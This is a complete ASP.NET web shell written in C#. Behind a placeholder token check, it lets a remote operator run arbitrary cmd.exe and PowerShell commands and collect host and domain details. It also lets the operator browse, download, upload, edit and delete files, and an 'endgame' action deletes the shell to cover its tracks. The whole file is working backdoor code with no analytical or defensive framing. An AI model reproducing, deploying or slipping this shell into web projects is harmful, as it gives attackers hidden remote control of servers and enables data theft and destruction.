<%@ Page Language="C#" Debug="true" validateRequest="false" %>
<%@ Import namespace="System.IO" %>
<%@ Import namespace="System" %>
<%@ Import namespace="System.Data" %>
<%@ Import namespace="System.Diagnostics" %>
<%@ Import namespace="System.Security.AccessControl" %> 
<%@ Import namespace="System.Security.Principal" %>
<%@ Import namespace="System.Collections.Generic" %> 
<%@ Import namespace="System.Collections" %> 


<script runat="server">
private const string auth_token = "{TOKEN}";

protected void Page_Load(object sender, EventArgs e)
{
	this.Login(auth_token);
	string cmd = Request.Form["command"];
	string path = Request.Form["path"];

	if(this.Action() == "init")
	{
		this.ServerInfo();
	}
	else if(this.Action() == "cmd")
	{
		this.CmdExecute(cmd);
	}
	else if(this.Action() == "power")
	{
		this.PowerExecute(cmd);
	}
	else if(this.Action() == "filebrowser")
	{
		this.FileBrowser(path);
	}
	else if(this.Action() == "editor")
	{
		this.FileEditor(path);
	}
	else if(this.Action() == "endgame")
	{
		this.DeleteShell();
	}
}
private string Action() 
{
	return (!String.IsNullOrEmpty(Request.Form["action"])) ? Request.Form["action"] : ""; 
}
private string Method() 
{
	return (!String.IsNullOrEmpty(Request.Form["method"])) ? Request.Form["method"] : ""; 
}
private void Login(string auth_token) 
{
	if (HttpContext.Current.Request.HttpMethod == "POST")
	{
		if(Request.Form["auth_token"] == auth_token)
		{ 
			Response.Output.Write("Worked!\n");
			Response.Clear();
		} else 
		{ 
			Response.Redirect("~/"); 
		}
	}
	else
	{
		Response.Redirect("~/");
	}
}
private void ServerInfo() 
{
	string os = Environment.OSVersion.ToString();
	string machine_name = Environment.MachineName;
	string domain = Environment.UserDomainName;
	string username = Environment.UserName;
	string local_ip = Request.ServerVariables["LOCAL_ADDR"];

	string server_info_1 = "{\"OS\": \""+ os +"\", \"Hostname\": \""+ machine_name +"\", \"Domain\": \""+ domain +"\", \"Username\": \""+ username +"\", \"LocalIP\": \""+ local_ip +"\"}";

	Response.Clear();
	Response.ContentType = "application/json";
	Response.Output.Write(server_info_1);

}
private void CmdExecute(string cmd)
{
	string cmd_exec;
	Process p = new Process();

	p.StartInfo.FileName = "cmd.exe";
	p.StartInfo.Arguments = "/c " + cmd;
	p.StartInfo.CreateNoWindow = true;
	p.StartInfo.UseShellExecute = false;
	p.StartInfo.RedirectStandardOutput = true;
	p.StartInfo.RedirectStandardError = true;

	try
	{
		p.Start();
		cmd_exec = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd(); 
	} 
	catch(Exception ex) 
	{
		cmd_exec = ex.Message; 
	}
	Response.Output.Write(cmd_exec);
}
private void PowerExecute(string cmd)
{
	string power_exec;
	Process p = new Process();

	p.StartInfo.FileName = "powershell.exe";
	p.StartInfo.Arguments = cmd;
	p.StartInfo.CreateNoWindow = true;
	p.StartInfo.UseShellExecute = false;
	p.StartInfo.RedirectStandardOutput = true;
	p.StartInfo.RedirectStandardError = true;

	try
	{
		p.Start();
		power_exec = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
	}
	catch(Exception ex)
	{
		power_exec = ex.Message;
	}
	Response.Output.Write(power_exec);
}
public void FileBrowser(string path)
{
	if(this.Method() == "remove")
	{
		this.fdRemove(path);
	} 
	else if(this.Method() == "download")
	{
		this.fDownload(path);
	}
	else if(this.Method() == "mkdir")
	{
		this.mkDir(path);
	}
	else if(this.Method() == "upload")
	{
		this.FileUploader(path);
	}
	else
	{
		DirectoryInfo di;

		string get_drive = this.getDrives();
		string get_cwd = this.getCwd(path);
		string tmp_file_browser = "";
		string file_browser;
		string di_path;
		int read = 0;
		int write = 0;
		int execute = 0;

		Response.Clear();
		Response.ContentType = "application/json";
		Response.Output.Write(get_drive);
		Response.Output.Write(get_cwd);

		try
		{
			if(string.IsNullOrEmpty(path))
			{
				path = Directory.GetCurrentDirectory();
				di = new DirectoryInfo(path);
			}
			else
			{
				di = new DirectoryInfo(path);
			}
		} 
		catch(Exception ex) 
		{
			return;
		}
		if(di.FullName.ToString() != di.Root.ToString()) 
		{
			tmp_file_browser = "\"ParentDir\": \"" + di.Parent.FullName + "\\\",";
		}

		try 
		{ 
			int count = 1;
			int dirCount = di.GetDirectories().Length;
			int fileCount = di.GetFiles().Length;
			tmp_file_browser += "\"Directories\": [";
			foreach(DirectoryInfo d in di.GetDirectories()) 
			{
				tmp_file_browser += "{";
				tmp_file_browser += "\"DirectoryName\": \"" + d.Name + "/\",";
				
				execute = 0;
				write = 0;
				read = 0;

				if (this.fPermissions(d.FullName).Contains("Execute")){
					execute = 1;
				}
				if (this.fPermissions(d.FullName).Contains("Write")) {
					write = 1;
				}
				if (this.fPermissions(d.FullName).Contains("Read")) {
					read = 1;
				}
				if (this.fPermissions(d.FullName).Contains("FullControl")) {
					execute = 1;
					write = 1;
					read = 1;
				}
				
				tmp_file_browser += "\"Perms\": [ {\"read\": \"" + read + "\", \"write\": \"" + write + "\", \"execute\": \"" + execute + "\"}],";
				tmp_file_browser += "\"CreationTime\": \"" + d.CreationTime.ToString(@"MM/dd/yyyy HH\:mm") + "\","; 
				tmp_file_browser += "\"LastAccess\": \"" + d.LastAccessTime.ToString(@"MM/dd/yyyy HH\:mm") + "\","; 
				tmp_file_browser += "\"LastWrite\": \"" + d.LastWriteTime.ToString(@"MM/dd/yyyy HH\:mm") + "\"";

				if (dirCount == count)
				{
					tmp_file_browser += "}";
				}
				else
				{
					tmp_file_browser += "},";
				}
				count++;
			}
			tmp_file_browser += "],";
			tmp_file_browser += "\"Files\": [";
			count = 1;
			foreach(FileInfo f in di.GetFiles()) 
			{
				execute = 0;
				write = 0;
				read = 0;

				if (this.fPermissions(f.FullName).Contains("Execute")){
					execute = 1;
				}
				if (this.fPermissions(f.FullName).Contains("Write")) {
					write = 1;
				}
				if (this.fPermissions(f.FullName).Contains("Read")) {
					read = 1;
				}
				if (this.fPermissions(f.FullName).Contains("FullControl")) {
					execute = 1;
					write = 1;
					read = 1;
				}
				
				tmp_file_browser += "{";
				tmp_file_browser += "\"Filename\": \"" + f.Name + "\",";
				tmp_file_browser += "\"FileSize\": \"" + this.fSize(f.Length) + "\",";
				tmp_file_browser += "\"FilePerms\": [ {\"read\": \"" + read + "\", \"write\": \"" + write + "\", \"execute\": \"" + execute + "\"}],";
				tmp_file_browser += "\"CreationTime\": \"" + f.CreationTime.ToString(@"MM/dd/yyyy HH\:mm") + "\","; 
				tmp_file_browser += "\"LastAccess\": \"" + f.LastAccessTime.ToString(@"MM/dd/yyyy HH\:mm") + "\","; 
				tmp_file_browser += "\"LastWrite\": \"" + f.LastWriteTime.ToString(@"MM/dd/yyyy HH\:mm") + "\"";

				if (fileCount == count)
				{
					tmp_file_browser += "}";
				}
				else
				{
					tmp_file_browser += "},";
				}
				count++;
			}

		} 
		catch(Exception ex)
		{
			return;
		}
		file_browser = tmp_file_browser.Replace('\\', '/');
		Response.Output.Write(file_browser);
		Response.Output.Write("]}");
	}
}
private string getDrives()
{
	DriveInfo[] allDrives = DriveInfo.GetDrives();
	string drives;
	
	drives = "{\"Drives\": [";
	foreach(DriveInfo d in allDrives)
	{
		if (allDrives.Last() == d)
		{
			drives += "\"" + d.Name + "\\\"";
		}
		else
		{
			drives += "\"" + d.Name + "\\\",";
		}
	}
	drives += "],";
	return drives;
}
private string getCwd(string path)
{
	string tmp_cwd;
	string cwd;

	if(string.IsNullOrEmpty(path))
	{
		tmp_cwd = Directory.GetCurrentDirectory();
		cwd = tmp_cwd.Replace("\\", "/");
	}
	else
	{
		tmp_cwd = path;
		cwd = tmp_cwd.Replace('\\', '/');
	}

	cwd = "\"CWD\": \"" + cwd + "\",";
	return cwd;
}
private string fPermissions(string path)
{
	AuthorizationRuleCollection rules;
	WindowsIdentity sid;
	
	try {
		sid = WindowsIdentity.GetCurrent();
		if(File.Exists(path)) rules = File.GetAccessControl(path).GetAccessRules(true, true, typeof(SecurityIdentifier));
		else if(Directory.Exists(path)) rules = File.GetAccessControl(path).GetAccessRules(true, true, typeof(SecurityIdentifier));
		else return "? ? ?";
	} catch (Exception ex) { 
		return ex.Message;
	}
	foreach(FileSystemAccessRule rule in rules) {
		if(rule.IdentityReference.ToString() != sid.User.Value && !sid.Groups.Contains(rule.IdentityReference)) continue;
		return rule.AccessControlType + " : " + rule.FileSystemRights;
	}
	return "? ? ?";
}
private string fSize(double flen)
{
	if(flen > (1024 * 1024 * 1024)) return ((int)flen / (1024 * 1024 * 1024)).ToString() + " GB";
	if(flen > (1024 * 1024)) return ((int)flen / (1024 * 1024)).ToString() + " MB";
	if(flen > 1024) return ((int)flen / 1024).ToString() + " KB";
	return flen.ToString() + " B"; 
}
private void fDownload(string path) 
{
	if(Directory.Exists(path)) return; 
	string file_name = path.Split('\\')[(path.Split('\\').Length - 1)];
	
	Response.ClearContent();
	Response.ContentType = "application/force-download";
	Response.AppendHeader("Content-Disposition", "attachment; filename=" + file_name);
	Response.TransmitFile(path);
	Response.End(); 
}
private bool mkDir(string path) 
{
	try {
		Directory.CreateDirectory(path);
		return true; 
	} catch {
		return false;
	}
	return false;
}
private void fdRemove(string path)
{ 
	string ext = Path.GetExtension(path);
	if (string.IsNullOrEmpty(ext))
	{
		if(Directory.Exists(path))
		{
			try
			{
				if (Directory.GetFiles(path).Length == 0 && 
					Directory.GetDirectories(path).Length == 0)
				{
					Directory.Delete(path, false);
					Response.Output.Write("1");
				}
				else
				{
					Response.Output.Write("0");
				}
			}
			catch (IOException e)
			{
				Response.Output.Write("Access Denied");
			}
		}
	}
	else
	{
		if(File.Exists(path))
		{
			try 
			{
				File.Delete(path);
				Response.Output.Write("1");
			}
			catch (IOException e)
			{
				Response.Output.Write("Access Denied");
			}
		}
		else
		{
			Response.Output.Write("0");
		}
	}
}

private void FileUploader(string path)
{
	foreach (string fileName in Request.Files)
	{
		HttpPostedFile file = Request.Files[fileName];
		if (file != null && file.ContentLength > 0)
		{
			var str = new StreamReader(file.InputStream).ReadToEnd();
			byte[] data = Convert.FromBase64String(str);
			string decodedString = Encoding.UTF8.GetString(data);
			StreamWriter sw = new StreamWriter(path, false, Encoding.Default);
			sw.Write(decodedString);
			sw.Close();
			Response.Output.Write("1");
		}
		else
		{
			Response.Output.Write("0");
		}
	}
}
public void FileEditor(string path)
{ 
	if(this.Method() == "read")
	{
		string read_file = this.fRead(path);
		Response.Output.Write(read_file);
	}
	else if(this.Method() == "write")
	{
		this.fWrite(path);
	}
}
private bool fWrite(string path) 
{
	string text = Request.Form["text"];
	if(Directory.Exists(path)) return false; 
	try { 
		byte[] data = Convert.FromBase64String(text);
		string decodedString = Encoding.UTF8.GetString(data);
		StreamWriter sw = new StreamWriter(path, false, Encoding.Default);
		sw.Write(decodedString);
		sw.Close();
		return true;
	} catch {
		return false;
	}
	return false;
}
private string fRead(string path) 
{
	if(File.Exists(path)) {
		try { 
			StreamReader sr = new StreamReader(path, Encoding.Default);
			string data = sr.ReadToEnd();
			sr.Close();
			return data; 
		} catch(Exception ex) {
			return ex.Message;
		}
	} 
	return "Can't access file: " + path;
}
private void DeleteShell()
{
	string path = HttpRuntime.AppDomainAppPath;
	string filename = Path.GetFileName(Request.Path);
	path += filename;

	string cmd_exec;
	Process p = new Process();

	p.StartInfo.FileName = "cmd.exe";
	p.StartInfo.Arguments = "/c del " + path;
	p.StartInfo.CreateNoWindow = true;
	p.StartInfo.UseShellExecute = false;
	p.StartInfo.RedirectStandardOutput = true;
	p.StartInfo.RedirectStandardError = true;

	try
	{
		p.Start();
		cmd_exec = "1";
		
	} 
	catch 
	{
		cmd_exec = "0";
	}
	Response.Output.Write(cmd_exec);
}
</script>